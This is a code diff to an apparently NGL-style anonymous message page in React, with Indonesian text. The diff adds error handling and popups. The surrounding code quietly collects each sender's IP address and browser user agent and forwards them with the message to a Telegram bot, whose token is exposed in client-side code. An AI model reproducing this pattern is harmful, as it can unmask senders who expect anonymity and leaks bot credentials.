@@ -5,6 +5,7 @@ export default function NGLPage() {
   const [message, setMessage] = useState("");
   const [loading, setLoading] = useState(false);
   const [success, setSuccess] = useState(false);
+  const [error, setError] = useState(false);
   const [userInfo, setUserInfo] = useState({
     ip: "Tidak diketahui",
     userAgent: navigator.userAgent,
@@ -12,7 +13,6 @@ export default function NGLPage() {
   });
 
   useEffect(() => {
-    // Ambil alamat IP pengguna
     fetch("https://api.ipify.org?format=json")
       .then((res) => res.json())
       .then((data) => {
@@ -36,8 +36,13 @@ export default function NGLPage() {
 
   const handleSubmit = async (e) => {
     e.preventDefault();
-    const botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN; // Simpan token di .env
-    const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID; // Simpan chat ID di .env
+    const botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
+    const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
+
+    if (!botToken || !chatId) {
+      alert("Token atau Chat ID belum diatur di .env");
+      return;
+    }
 
     if (message.trim() === "") {
       alert("Pesan tidak boleh kosong!");
@@ -46,6 +51,7 @@ export default function NGLPage() {
 
     setLoading(true);
     setSuccess(false);
+    setError(false);
 
     try {
       const response = await fetch(
@@ -65,14 +71,17 @@ PESAN: ${message}`,
         }
       );
 
+      const result = await response.json();
       if (response.ok) {
         setMessage("");
         setSuccess(true);
       } else {
-        alert("Gagal mengirim pesan. Coba lagi.");
+        console.error("Telegram API Error:", result);
+        setError(true);
       }
-    } catch (error) {
-      alert("Terjadi kesalahan. Coba lagi.");
+    } catch (err) {
+      console.error("Error sending message:", err);
+      setError(true);
     } finally {
       setLoading(false);
     }
@@ -80,6 +89,7 @@ PESAN: ${message}`,
 
   const closePopup = () => {
     setSuccess(false);
+    setError(false);
   };
 
   return (
@@ -278,6 +288,17 @@ PESAN: ${message}`,
               <div className="popup-content">
                 <i className="fas fa-check-circle"></i>
                 <p>Pesan berhasil dikirim!</p>
+                <button className="popup-close" onClick={closePopup}>
+                  OK
+                </button>
+              </div>
+            </div>
+          )}
+          {error && (
+            <div className="popup-success">
+              <div className="popup-content">
+                <i className="fas fa-times-circle" style={{ color: "red" }}></i>
+                <p>Pesan gagal dikirim. Coba lagi.</p>
                 <button className="popup-close" onClick={closePopup}>
                   OK
                 </button>
